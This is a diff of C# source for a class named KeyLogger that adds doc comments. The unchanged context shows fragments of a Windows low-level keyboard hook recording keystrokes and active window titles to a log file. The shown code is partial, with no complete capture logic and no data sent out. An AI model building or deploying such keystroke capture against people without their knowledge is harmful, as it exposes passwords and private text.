@@ -15,6 +15,9 @@ namespace Hooks
         private static IntPtr _hookID = IntPtr.Zero;
         private static String log = "";
 
+        ///<summary>
+        ///Initialize the keylogger.
+        ///</summary>
         public KeyLogger(String logloc)
         {
             log = logloc;
@@ -28,6 +31,9 @@ namespace Hooks
             }
         }
 
+        ///<summary>
+        ///Disconnect the hook.
+        ///</summary>
         public void Deactivate()
         {
             UnhookWindowsHookEx(_hookID);
@@ -41,6 +47,9 @@ namespace Hooks
         [DllImport("user32.dll")]
         static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
+        ///<summary>
+        ///Get the active window name.
+        ///</summary>
         private static string GetActiveWindowName()
         {
             const int numChars = 256;
@@ -54,6 +63,9 @@ namespace Hooks
             return null;
         }
 
+        ///<summary>
+        ///Connect the hook to the process.
+        ///</summary>
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
